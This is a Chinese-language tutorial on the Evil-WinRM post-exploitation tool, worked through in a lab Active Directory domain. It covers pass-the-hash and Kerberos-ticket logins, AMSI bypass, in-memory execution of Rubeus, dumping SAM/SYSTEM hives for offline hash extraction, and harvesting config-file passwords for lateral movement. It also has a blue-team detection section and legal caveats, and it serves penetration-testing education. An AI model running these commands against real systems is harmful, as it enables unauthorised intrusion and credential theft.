# Evil-WinRM（WinRM 交互式 Shell）

> **一句话**：用密码、NT hash 或 Kerberos 票据，通过 WinRM（5985/5986）拿到一个**交互流畅的 PowerShell 远程 Shell**，还支持本地脚本/可执行文件「即传即用」。
> **分类**：后渗透 / 横向移动 ｜ **Kali 包**：`evil-winrm`（命令 `evil-winrm`）｜ **官方文档**：<https://github.com/Hackplayers/evil-winrm>

---

## 1. 它解决什么问题

拿到 Windows 凭据后，多数远程执行通道（`psexec`、`smbexec`）都**会在目标上落地文件、创建服务**，动静大。而且它们的交互体验很差：命令无回显、不能 `cd` 保持状态、PowerShell 里按方向键就乱码。

WinRM 是「`psexec` 的干净替代品」：

| 维度 | `impacket-psexec` | `evil-winrm` |
|------|-------------------|--------------|
| 落地文件 | 是（`ADMIN$` 写 exe） | 否 |
| 创建服务 | 是（7045 事件） | 否 |
| 交互体验 | 半交互，易断 | 完整交互，支持 Tab/历史 |
| 传输通道 | SMB（445） | HTTP/S（5985/5986） |
| PowerShell 支持 | 弱 | **原生 PSRP** |
| 上传工具 | SMB 共享 | `upload`/`download` + `-e`/`-s` 自动加载 |

**代价**：WinRM 默认**未启用**，且需要**凭据 + 目标把用户放在 `Remote Management Users` 或管理员组**。所以它属于「有条件就用，没条件就走 WMI/SMB」。

对比同类：

- **vs `nxc winrm -x`**：NetExec 适合**批量**跑单条命令；Evil-WinRM 适合**单点长时间交互**。
- **vs `Enter-PSSession`**：功能等价，但 `evil-winrm` 在 Linux 上原生支持 **NT hash 登录（PTH）** 与 ccache 票据，Windows 原生工具做不到。
- **vs `impacket-wmiexec`**：WMI 通道不落地文件，但交互性差；Evil-WinRM 交互性最好。

---

## 2. 工作原理

### 2.1 协议栈

```
你的 Kali ──HTTP(S)──► 目标 5985(HTTP) / 5986(HTTPS)
   │   WS-Management（SOAP over HTTP）
   │        │
   │        └─► WinRM 服务（Windows Remote Management）
   │                 └─► PSRP（PowerShell Remoting Protocol）
   │                          └─► 在目标上创建 runspace（无新进程！
   │                                  winrm 由 wsmprovhost.exe 承载）
   └─ evil-winrm（Ruby，基于 winrm / winrm-fs gem）
```

关键点：

- **认证方式**：
  - **明文密码** → HTTP `Basic`/`Negotiate`；
  - **NT hash（PTH）**：WinRM 支持哈希登录（`-H`），这是它比原生工具强的核心原因；
  - **Kerberos**：`-r REALM` + `/etc/krb5.conf`，或用 ccache（`-K`）。
- **不落地**：PSRP 在 `wsmprovhost.exe` 里建 runspace，**不创建新进程、不写服务**——所以 7045 事件不会出现。但会留下 **WinRM 操作日志（Microsoft-Windows-WinRM/Operational，事件 91/168）**。
- **PSRP 的一个副作用**：所有命令都在同一个 runspace 里，`cd` 能保持（体验像本地 shell）；但也意味着**不适用于需要独立进程上下文的操作**（如某些提权利用）。
- **文件传输**：`winrm-fs` gem 通过 WinRM 的 shell 通道分块上传/下载，走同一端口，无需额外共享。

### 2.2 前提条件检查（必做）

```bash
# ① 目标是否开放 5985/5986
nmap -p 5985,5986 -sV <target>

# ② 账号是否有权限（Remote Management Users / Administrators）
nxc winrm <target> -u <user> -p '<pass>'
#   => [+] ... (Pwn3d!)  表示可执行
```

---

## 3. 安装与快速上手

```bash
sudo apt update
sudo apt install evil-winrm
command -v evil-winrm
evil-winrm -h
```

```console
root@kali:~# evil-winrm -h
Evil-WinRM shell v4.1
Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-a USERAGENT]
                  [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH] [-k PRIVATE_KEY_PATH]
                  [-r REALM] [-K TICKET_FILE] [--spn SPN_PREFIX] [-l]
```

最小示例（**授权/靶场**）：

```bash
evil-winrm -i 192.168.56.20 -u Administrator -p 'Passw0rd!'
```

```console
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Pass-the-Hash：

```bash
evil-winrm -i 192.168.56.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## 4. 核心参数详解

| 参数 | 作用 | 使用建议 |
|------|------|----------|
| `-i, --ip <IP/FQDN>` | 目标地址 | Kerberos 认证必须用 **FQDN** |
| `-u, --user <USER>` | 用户名 | Kerberos 时可省略（用票据里的身份） |
| `-p, --password <PASS>` | 明文密码 | 可用 `-p ''` 表示空口令 |
| `-H, --hash <NTHASH>` | **NT hash（PTH）** | 只要 NT 部分，不带 `LM:` |
| `-P, --port <PORT>` | 端口 | 默认 5985；HTTPS 用 5986 且加 `-S` |
| `-S, --ssl` | 启用 HTTPS | 5986 必须；自签证书需容忍（工具默认跳过校验） |
| `-r, --realm <DOMAIN>` | Kerberos 域 | 需在 `/etc/krb5.conf` 配置：`CONTOSO.COM = { kdc = dc01.contoso.com }` |
| `-K, --ccache <FILE>` | 用 Kerberos 票据文件（ccache/kirbi，自动识别） | 配合 `impacket-getTGT`/`getST` 使用 |
| `--spn <PREFIX>` | SPN 前缀 | 默认 `HTTP`；`WSMAN` 等视环境 |
| `-s, --scripts <DIR>` | 本地 PowerShell 脚本目录 | 目录内脚本可直接调用（如 `-s /opt/ps1` 里的 `PowerView.ps1`） |
| `-e, --executables <DIR>` | **本地 exe/.NET 程序集目录** | 目录内 exe 可像命令一样直接执行（工具内 `menu` 里也能查） |
| `-c, --pub-key <FILE>` | 公钥证书 | 证书认证（需目标已信任该证书） |
| `-k, --priv-key <FILE>` | 私钥 | 与 `-c` 配对 |
| `-a, --user-agent <UA>` | 自定义 User-Agent | 默认 `Microsoft WinRM Client`；改动可能触发检测，**不建议在真实项目乱改** |
| `-U, --url <URL>` | WinRM 端点 | 默认 `/wsman`；非标准部署时用 |
| `-l, --log` | 记录会话 | 写报告/复盘必备 |
| `-n, --no-colors` | 关闭颜色 | 重定向日志时用 |
| `-N, --no-rpath-completion` | 关闭远程路径补全 | 卡顿时用（大目录补全会很慢） |
| `-V, --version` | 版本 | —— |

**会话内常用能力**：

| 交互命令 | 作用 |
|----------|------|
| `upload <本地> <远程>` | 上传文件（走 WinRM 通道） |
| `download <远程> <本地>` | 下载文件 |
| `menu` | 列出 `-s`/`-e` 加载的模块与脚本 |
| `Invoke-Binary <name.exe>` | 在内存中加载并运行 .NET 程序集（**不落地**） |
| `services` | 列出服务（工具内置快捷命令） |
| `Bypass-4MSI` | 关闭 AMSI（**仅授权测试**，用于验证防护有效性） |
| `history` / `clear` / `exit` | 会话管理 |

---

## 5. 实战演练

> **环境声明**：全部在**自建 AD 靶场**（GOAD 或自建域 + Windows Server 靶机，Host-Only 网络）中执行。示例：域 `contoso.local`，主机 `WEB01` = `192.168.56.20`，DC = `192.168.56.10`。**禁止对未授权主机连接 WinRM。**

### 场景 1：三种认证方式把 shell 拿下来

```bash
# ① 明文密码
evil-winrm -i 192.168.56.20 -u contoso\\Administrator -p 'Passw0rd!'
```

```console
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
contoso\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
WEB01
```

**注意**：在 bash 里 `contoso\Administrator` 的反斜杠要转义（`contoso\\Administrator`）或用引号包起来（`'contoso\Administrator'`）。

```bash
# ② Pass-the-Hash（WinRM 的杀手锏）
evil-winrm -i 192.168.56.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

```bash
# ③ Kerberos 票据（先拿 ccache）
impacket-getTGT contoso.local/jdoe:'Summer2024!' -dc-ip 192.168.56.10
export KRB5CCNAME=jdoe.ccache
evil-winrm -i web01.contoso.local -r contoso.local -K jdoe.ccache
```

**解读**：三种方式对应三类凭据来源：明文（LSASS/配置文件中找到）、hash（SAM/NTDS/内存转储）、票据（Kerberos 攻击产物）。**用哪种取决于你手上有什么**。

### 场景 2：交互式后渗透（枚举 → 提权检查 → 抓凭据）

```console
*Evil-WinRM* PS C:\> whoami /groups | findstr /i "admin"
*Evil-WinRM* PS C:\> net user
*Evil-WinRM* PS C:\> net localgroup Administrators
*Evil-WinRM* PS C:\> systeminfo | findstr /i "OS Name OS Version"
```

```console
*Evil-WinRM* PS C:\> Get-LocalGroupMember -Group "Remote Management Users"
```
```console
ObjectClass Name              PrincipalSource
----------- ----------------- ---------------
User        CONTOSO\jdoe      ActiveDirectory
```

**解读**：确认自己是靠哪个组拿到 WinRM 访问权的——如果只是 `Remote Management Users`，说明**没有本地管理员权限**，`hashdump`/服务类操作会失败。

```console
# 上传并运行本地工具（-s / -e 先用目录加载，再直接调用）
*Evil-WinRM* PS C:\> upload /opt/win/winPEASx64.exe C:\Windows\Temp\wpe.exe
*Evil-WinRM* PS C:\> C:\Windows\Temp\wpe.exe
```

```bash
# 启动时加载目录，之后可直接按名字调用
evil-winrm -i 192.168.56.20 -u Administrator -p 'Passw0rd!' \
  -s /opt/win/ps1 -e /opt/win/exe
```

```console
*Evil-WinRM* PS C:\> menu
  Available scripts:
    PowerView.ps1
    Powermad.ps1
  Available executables:
    Rubeus.exe
    winPEASx64.exe
*Evil-WinRM* PS C:\> Invoke-Binary Rubeus.exe
```

**解读**：`-e` 目录里的 .NET 程序集用 `Invoke-Binary` 执行时是**内存加载**（不写盘），比 `upload` 后执行隐蔽，但仍是强 EDR 信号（.NET 程序集反射加载）。

```console
# 抓取凭据（需本地管理员）
*Evil-WinRM* PS C:\> reg save HKLM\SAM C:\Windows\Temp\sam.hive
*Evil-WinRM* PS C:\> reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
*Evil-WinRM* PS C:\> download C:\Windows\Temp\sam.hive /tmp/sam.hive
*Evil-WinRM* PS C:\> download C:\Windows\Temp\system.hive /tmp/system.hive
```

```bash
# 本地离线解析（不依赖 Windows 工具）
impacket-secretsdump -sam /tmp/sam.hive -system /tmp/system.hive LOCAL
```

```console
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**解读**：`reg save` + `download` + 本地 `secretsdump` 是**最稳的抓 hash 方式**，不依赖在目标上运行任何攻击工具，文件扫描类 EDR 很难判定（hive 文件本身是合法格式）。清理战场时记得删掉 `C:\Windows\Temp\*.hive`。

### 场景 3：批量找 WinRM 可用主机，再单点交互（完整横向链）

```bash
# ① 批量（NetExec 负责广度）
nxc winrm 192.168.56.0/24 -u svc_backup -p 'Backup2023!' --continue-on-success
```

```console
WINRM  192.168.56.20  5985  WEB01  [+] contoso.local\svc_backup:Backup2023! (Pwn3d!)
WINRM  192.168.56.30  5985  APP01  [+] contoso.local\svc_backup:Backup2023! (Pwn3d!)
```

```bash
# ② 单点（Evil-WinRM 负责深度）
evil-winrm -i 192.168.56.20 -u svc_backup -p 'Backup2023!' -l -e /opt/win/exe
```

```console
*Evil-WinRM* PS C:\> Get-ADComputer -Filter * -Properties OperatingSystem | Select Name,OperatingSystem
*Evil-WinRM* PS C:\> Get-ADUser -Filter {ServicePrincipalName -like "*"} | Select SamAccountName,ServicePrincipalName
```

```bash
# ③ 从这台机器继续找凭据（DPAPI/注册表/脚本里的密码）
*Evil-WinRM* PS C:\> dir C:\scripts\ /s /b | findstr /i "config"
*Evil-WinRM* PS C:\> type C:\scripts\deploy.config
```

```console
[db]
server=SQL01.contoso.local
password=SqlSvc2022!
```

```bash
# ④ 拿到新凭据 → 下一跳（继续 nxc / impacket，或隧道进更深网段）
nxc mssql 192.168.56.40 -u sa -p 'SqlSvc2022!' -q 'select @@version'
```

**解读**：这是典型的「**广度优先找点 → 深度优先挖凭据 → 再用新凭据扩展**」循环。Evil-WinRM 在「深度」环节最佳：Tab 补全、`cd` 保持、`Get-ADUser` 等 PS 模块原生可用。

---

## 6. 输出解读

| 输出 | 含义 | 下一步 |
|------|------|--------|
| `Info: Establishing connection to remote endpoint` | 连接建立中 | 正常 |
| `*Evil-WinRM* PS C:\...>` | 已进入交互 shell | 开始枚举 |
| `Error: An error of type WinRM::WinRMAuthorizationError` | **权限不足**：不在 `Remote Management Users`/管理员组 | 换账号；或该账号无 WinRM 权限 |
| `Error: InvalidCredentials` | 凭据错误 | 检查用户名格式（域前缀）、hash 格式 |
| `Error: Could not resolve host` | 主机名/DNS 问题 | Kerberos 场景检查 `/etc/hosts` |
| `Kerberos: krb5_get_init_creds_password` 相关错误 | realm/kdc/DNS 配置不全 | 检查 `krb5.conf` 与 DNS |
| `Error: Connection timed out` | 5985 未开放/被防火墙拦 | `nmap -p 5985`；换 WMI/SMB 通道 |
| `SSL_connect returned=1` | 用了 `-S` 但目标是 HTTP 5985 | 去掉 `-S`，或改 `-P 5986 -S` |
| `Access is denied`（执行命令时） | WinRM 可登录但无本地管理员权限 | 命令受限，先提权 |
| `Bypass-4MSI` 后仍被杀 | 目标有 EDR 而不只是 Defender | 说明防护有效；授权测试中如实记录 |
| `Could not load file or assembly`（`Invoke-Binary`） | .NET 版本/架构不符 | 用对应架构的程序集 |

**成功判据**：出现 `*Evil-WinRM* PS <CWD>>` 提示符，且 `whoami` 返回预期身份。

---

## 7. 与其他工具配合

```
凭据来源                       通道选择                        深化
────────                       ────────                        ────
impacket-secretsdump ──► hash ──► evil-winrm -H      ──┐
impacket-GetUserSPNs ──► 明文 ──► evil-winrm -p        ├─► 枚举（PowerView/AD 模块）
impacket-getTGT/ST  ──► 票据 ──► evil-winrm -K        │
netexec 批量验证     ──► 定目标 ──► evil-winrm -i      ├─► 提权检查（winPEAS）
impacket-ntlmrelayx ─► 中继后 ──► （或 RBCD/Shadow Credentials 路径）│
                                                        ├─► 抓凭据（reg save / lsassy / mimikatz）
                                                        └─► 隧道（chisel / ligolo-ng）→ 更深内网
```

- 批量验证与凭据雪球：[`netexec.md`](netexec.md)、[`crackmapexec.md`](crackmapexec.md)
- 哈希/票据获取：[`impacket.md`](impacket.md)、[`mimikatz.md`](mimikatz.md)
- Windows 提权检查：[`linpeas.md`](linpeas.md)（含 `winPEAS`）
- 隧道：[`chisel.md`](chisel.md)、[`ligolo-ng.md`](ligolo-ng.md)、[`proxychains4.md`](proxychains4.md)

---

## 8. 常见坑与排错

| 报错/现象 | 原因 | 解决 |
|-----------|------|------|
| `WinRMAuthorizationError` 但凭据正确 | 账号不在 `Remote Management Users` 或 `Administrators` | 换账号；或先用其它通道加组（需权限） |
| 目标 5985 未开放 | WinRM 服务未启用（**默认关闭**） | 换 WMI（`impacket-wmiexec`）或 SMB 通道；若你有权限可用 `Enable-PSRemoting`（授权测试） |
| `PowerShell 语言模式是 ConstrainedLanguage` | AppLocker/WDAC 限制脚本 | 用 `-x` 类单命令（不支持时受限严重）；或改为不依赖 PS 的操作 |
| PowerShell 里中文乱码 | 代码页不匹配 | 会话内 `chcp 65001` 或设置 `$OutputEncoding` |
| `-H` 传了 `LM:NT` 全串 | 参数只要 NT 部分 | `-H <NTHASH>` |
| 用户名字段格式错误 | 域前缀写法 | bash 中用单引号包裹：`-u 'contoso\Administrator'`（反斜杠是转义字符，直接写会丢） |
| Kerberos 报 `Server not found in Kerberos database` | 用的是 IP 而非 FQDN | `-i web01.contoso.local` + `-r contoso.local` |
| 命令执行慢/卡 | 远程路径补全开销 | 加 `-N` 关闭补全；或 `-n` 关颜色 |
| 会话莫名断开 | 网络抖动/空闲超时 | 保持轻量操作；必要时重连（WinRM 无持久会话） |
| `upload` 大文件失败 | 单文件太大/超时 | 分卷压缩；或改用 SMB 通道（`impacket-smbserver` + `copy`） |
| `Bypass-4MSI` 无效 | 目标有 EDR 或 AMSI 已加固 | 不要强求；记录为目标防护有效的证据 |
| 每次命令都新建 runspace 太慢 | 正常 PSRP 行为 | 批量操作用一条命令串联（`;`）而非多次单命令 |

---

## 9. 防御视角（蓝队）

| 攻击面 | 检测信号 | 缓解措施 |
|--------|----------|----------|
| WinRM 被滥用 | **Microsoft-Windows-WinRM/Operational 事件 91、168**（连接与命令）；Security 4624 类型 3 + 登录进程 `wsmprovhost.exe` | 限制 5985 入站（仅管理网段）、**用 5986 + 证书**、把 WinRM 纳入特权访问工作站（PAW）模型 |
| `wsmprovhost.exe` 异常父进程 | 4688 中 `wsmprovhost.exe` 启动 `cmd.exe`/`powershell.exe`/`rundll32.exe` | EDR 行为规则；应用白名单（WDAC） |
| PTH 到 WinRM | 4624 类型 3 且 `Authentication Package = NTLM`、目标为服务器 | **禁用 NTLM**（Kerberos-only）、LAPS、Credential Guard |
| `reg save` 抓 hive | 4663/4656 对 `HKLM\SAM`、`HKLM\SECURITY` 的访问；Temp 目录出现 `*.hive` | 最小权限、EDR 注册表保存行为告警、监控 Temp 目录写入 |
| `Invoke-Binary` 内存加载 .NET | .NET 程序集反射加载（`Assembly.Load`）行为、`AppDomain` 异常 | EDR 内存扫描、AMSI（**不要关闭**）、约束语言模式 |
| `Bypass-4MSI` | AMSI 被 patch（`amsi.dll` 内存被改） | AMSI 完整性保护、Defender 篡改保护 |
| 明文密码/哈希用于登录 | 4624 中同一账号在多台服务器登录、来源集中 | 分层管理、特权账号不跨层登录、MFA（RDP/Web，非 WinRM） |

**关键结论**：WinRM 本身**不是漏洞**，是合法的管理协议。防御的核心是**限制谁能连、从哪连、用什么凭据连**——而不是关闭它（关掉会阻碍正常运维，反而诱使团队用更糟的变通方案）。

---

## 10. 参考

- Evil-WinRM 官方仓库（含完整参数与用法示例）：<https://github.com/Hackplayers/evil-winrm>
- Kali 工具页：<https://www.kali.org/tools/evil-winrm/>
- WinRM 事件日志说明：Microsoft-Windows-WinRM/Operational
- MITRE ATT&CK · 远程服务滥用（T1021.006 Windows Remote Management）：<https://attack.mitre.org/techniques/T1021/006/>
- 本地命令：`evil-winrm -h`

## ⚠️ 法律与伦理

未授权使用他人凭据通过 WinRM 登录他人系统，可能触犯《刑法》第 285 条（非法侵入计算机信息系统、非法获取计算机信息系统数据）与第 286 条。使用**泄露或窃取的凭据**（包括 hash 与票据）登录，即便口令是「公开的」，也仍属未授权访问。

本教程仅用于：**书面授权的渗透测试与红队演练、CTF、自建 Windows 靶场与实验室、蓝队检测验证**。请确保授权书覆盖目标主机与时间窗，测试结束清理上传的工具与临时文件（如 `C:\Windows\Temp\*.hive`），日志与凭据必须加密存储并脱敏。
